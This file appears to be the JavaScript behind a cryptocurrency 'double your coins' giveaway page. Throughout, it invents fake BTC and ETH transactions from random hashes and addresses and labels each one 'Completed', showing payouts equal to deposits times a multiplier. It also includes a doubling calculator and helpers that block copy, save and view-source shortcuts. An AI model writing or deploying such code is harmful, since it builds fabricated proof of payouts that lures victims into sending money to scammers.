const {
    wallet_btc: wallet_btc,
    wallet_eth: wallet_eth,
    min_btc: min_btc,
    max_btc: max_btc,
    min_eth: min_eth,
    max_eth: max_eth,
    multiplier: multiplier
} = window.cdata;

function lerp(e, t, n) {
    return (1 - n) * e + n * t
}

function round(e, t) {
    return Number(Math.round(e + "e" + t) + "e-" + t)
}

function copy_wallet(e) {
    var t = document.createElement("textarea");
    t.innerHTML = e, document.body.appendChild(t), t.select();
    document.execCommand("copy");
    document.body.removeChild(t)
}

function kill_ctrl_key_combo(e) {
    var t, n, o = new Array("a", "c", "x", "s", "u");
    if (window.event ? (t = window.event.keyCode, n = !!window.event.ctrlKey) : (t = e.which, n = !!e.ctrlKey), n)
        for (i = 0; i < o.length; i++)
            if (o[i].toLowerCase() == String.fromCharCode(t).toLowerCase()) return !1;
    return !0
}

function disable_selection(e) {
    void 0 !== e.style.MozUserSelect && (e.style.MozUserSelect = "none"), e.style.cursor = "default"
}

function double_mouse(e) {
    return 2 != e.which && 3 != e.which
}
$(document).ready((function() {
    function e(e, t) {
        t = t || "ABCDEFabcdef0123456789";
        for (var n = "", i = 0; i < e; i++) {
            var o = Math.floor(Math.random() * t.length);
            n += t.substring(o, o + 1)
        }
        return n
    }

    function t(e, t) {
        return e + Math.random() * (t + 1 - e)
    }

    function n() {
        const n = Math.random() > .5 ? "BTC" : "ETH";
        let i = "",
            o = "",
            r = 0,
            a = 0,
            c = "",
            l = e(6, "123456789"),
            s = 0;
        if ("BTC" === n) {
            i = "1" + e(11) + "...", o = wallet_btc;
            const n = lerp(min_btc, max_btc, .05);
            r = t(min_btc, n), a = r * multiplier, s = (r / 1e5).toFixed(8), r = r.toFixed(8), a = a.toFixed(8), c = e(10) + "..."
        } else if ("ETH" === n) {
            i = "0x" + e(11) + "...", o = wallet_eth;
            const n = lerp(min_eth, max_eth, .05);
            r = t(min_eth, n), a = r * multiplier, s = (r / 1e5).toFixed(5), r = r.toFixed(5), a = a.toFixed(5), c = "0x" + e(8) + "..."
        }
        $(`<div class="transaction-item">\n            <p class="txhash">${c}</p>\n            <p class="block">${l}</p>\n            <p class="from">${i}<br>${o}</p>\n            <div class="arrow"><img src="images/check.svg" alt=""></div>\n            <p class="to">${o}<br>${i}</p>\n            <p class="value">${a} ${n}<br>${r} ${n}</p>\n            <p class="fee">${s}</p>\n            <p class="status">Completed</p>\n        </div>`).hide().prependTo(".transaction-content").fadeIn("slow"), $(".transaction-item:eq(10)").remove()
    }
    for (let e = 0; e <= 10; e++) n();
    setInterval(n, 15500), $('a[href^="#"]').click((function() {
        var e = $(this).attr("href");
        return $("html, body").animate({
            scrollTop: $(e).offset().top - 50
        }, 500), !1
    })), $("input[name=input]").ForceNumericOnly().keyup((function() {
        let e = parseFloat($(this).val());
        e = isNaN(e) ? 0 : 2 * e, $("#calculator_number").text(e.toLocaleString())
    })), $(".participate-button").click((function() {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200), setTimeout((() => $(this).parents(".participate-item").find(".address-done").fadeOut(200)), 1e3)
    }))
})), jQuery.fn.ForceNumericOnly = function() {
    return this.each((function() {
        $(this).keydown((function(e) {
            var t = e.charCode || e.keyCode || 0;
            return 8 == t || 46 == t || 190 == t || t >= 35 && t <= 40 || t >= 48 && t <= 57 || t >= 96 && t <= 105
        }))
    }))
};